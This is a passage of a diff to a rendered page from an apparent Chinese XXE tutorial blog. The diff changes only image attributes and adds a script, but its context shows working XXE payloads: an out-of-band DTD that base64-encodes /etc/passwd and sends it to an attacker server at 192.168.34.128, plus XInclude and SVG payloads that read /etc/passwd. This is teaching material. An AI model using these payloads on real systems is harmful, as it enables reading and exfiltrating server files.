 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 1. 读取文件并进行 Base64 编码 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 2. 嵌套构造外发实体（注意 &amp;#x25; 是 % 的编码） --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.34.128:8888/?data=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 3. 执行 eval，生成 send 实体 --&gt;</span></span><br><span class="line">%eval;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 4. 执行 send，触发外发请求 --&gt;</span></span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>
 
-<p>如kail做攻击服务器<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_27.png" alt="在这里插入图片描述"></p>
+<p>如kail做攻击服务器<br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_27.png" alt="XXE基础·图27"></p>
 <p>第二部分payload：burp发送</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.34.128:8080/evil.dtd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 
-<p>burp发送payload后<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_28.png" alt="在这里插入图片描述"></p>
+<p>burp发送payload后<br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_28.png" alt="XXE基础·图28"></p>
 <p>成功外带数据，收工</p>
 <hr>
 <h2 id="0x08-Xinclude"><a href="#0x08-Xinclude" class="headerlink" title="0x08.Xinclude"></a>0x08.Xinclude</h2><p>XML 的 XInclude 机制与 PHP 的 include、Python&#x2F;Java 的 import 类似，本质上都是一种 文件包含 机制。其核心作用在于：将通用组件（如函数定义、配置片段）抽取为独立文件，在需要时动态引入。</p>
@@ -468,7 +452,7 @@ MathJax = {
 <p>payload：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xxe</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">&quot;/etc/passwd&quot;</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_29.png"></p>
+<p><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_29.png"></p>
 <p>搞定收工</p>
 <hr>
 <h2 id="0x09-使用SVG进行XXE漏洞利用"><a href="#0x09-使用SVG进行XXE漏洞利用" class="headerlink" title="0x09.使用SVG进行XXE漏洞利用"></a>0x09.使用SVG进行XXE漏洞利用</h2><p>SVG文件：可缩放矢量图形(Scalable Vector Graphics,SVG)基于XML 标记语言，用于描述二维的矢量图形。</p>
@@ -477,7 +461,7 @@ MathJax = {
 <p>将一个svg格式的图片以文本形式打开，实际上就是一堆xml代码，利用其特定注入payload</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;2000px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1200px&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;white&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Courier&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;12&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;black&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_30.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_30.png" alt="XXE基础·图29"></p>
 <p>收工</p>
 
 		  <div class="article-footer-copyright">
@@ -688,6 +672,7 @@ MathJax = {
 <script src="/js/bootstrap.min.js"></script>
 <script src="/js/main.js"></script>
 <script src="/js/toc.js"></script>
+<script src="/js/reading.js"></script>
 <script src="/js/copy-code.js"></script>
 
    <script type="text/javascript">
